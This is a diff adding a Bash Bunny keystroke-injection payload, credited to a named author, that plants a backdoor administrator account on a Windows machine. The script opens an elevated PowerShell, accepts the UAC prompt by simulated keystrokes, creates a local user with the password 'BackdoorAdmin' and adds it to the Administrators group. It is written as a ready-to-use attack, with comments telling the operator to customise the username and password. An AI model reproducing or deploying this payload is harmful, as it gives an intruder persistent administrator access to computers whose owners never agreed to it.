@@ -1,0 +1,36 @@
+REM bashbunny creating backdoor accounts
+REM created by : brandon chambers
+
+REM open powershell
+GUI r
+DELAY 200
+STRING powershell start-process powershell -verb runas
+ENTER
+DELAY 800
+LEFT
+DELAY 400
+ENTER
+DELAY 300
+REM creating temp stored password
+
+STRING $Password = Read-Host -AsSecureString
+ENTER
+DELAY 100
+
+REM password for account (change "BackdoorAdmin" to your preferred password)
+STRING BackdoorAdmin
+ENTER
+DELAY 100
+
+REM creating account (change "UserName" to your prefered username)
+STRING New-LocalUser "UserName" -Password $Password -FullName "UserName" -Description "Account Description"
+ENTER 
+DELAY 100
+
+REM giving new account admin priv (change "UserName" to your accounts name)
+STRING Add-LocalGroupMember -Group "Administrators" -Member "UserName"
+ENTER 
+DELAY 100
+
+STRING exit
+ENTER
